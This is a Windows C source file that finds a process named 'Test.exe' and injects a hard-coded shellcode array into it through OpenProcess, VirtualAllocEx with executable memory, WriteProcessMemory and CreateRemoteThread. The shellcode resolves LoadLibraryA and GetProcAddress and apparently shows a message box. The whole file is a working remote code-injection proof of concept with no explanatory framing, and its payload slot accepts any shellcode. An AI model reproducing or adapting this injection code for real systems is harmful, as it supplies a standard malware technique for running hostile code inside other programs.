#include "Public.h"

DWORD GetProcessId(PCHAR szExeName)

{
	DWORD dwRet = 0;
	DWORD dwCount = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe = { 0 };
		pe.dwSize = sizeof(PROCESSENTRY32);

		BOOL bRet = Process32First(hSnapshot, &pe);

		while (bRet)
		{
			if (!strcmp(szExeName, pe.szExeFile))
			{
				dwCount++;
				dwRet = pe.th32ProcessID;
			}
			bRet = Process32Next(hSnapshot, &pe);
		}

		if (dwCount > 1)
		{
			dwRet = 0xFFFFFFFF;
		}

		CloseHandle(hSnapshot);
	}

	return dwRet;
}

BOOL Start()
{
	unsigned char shellcode[] =
		"\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad"
		"\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78"
		"\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8"
		"\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f"
		"\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2"
		"\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c"
		"\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68"
		"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61"
		"\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9"
		"\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72"
		"\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78"
		"\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
		"\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83"
		"\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0\xc3";


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	BOOL state;
	DWORD pid = GetProcessId("Test.exe");

	printf("Injecting to PID: %i\n", pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	state = WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!remoteThread)
	{
		printf("failure\n");
		CloseHandle(processHandle);
		return false;
	}
	else
	{
		printf("success\n");
		CloseHandle(processHandle);
		return true;
	}
}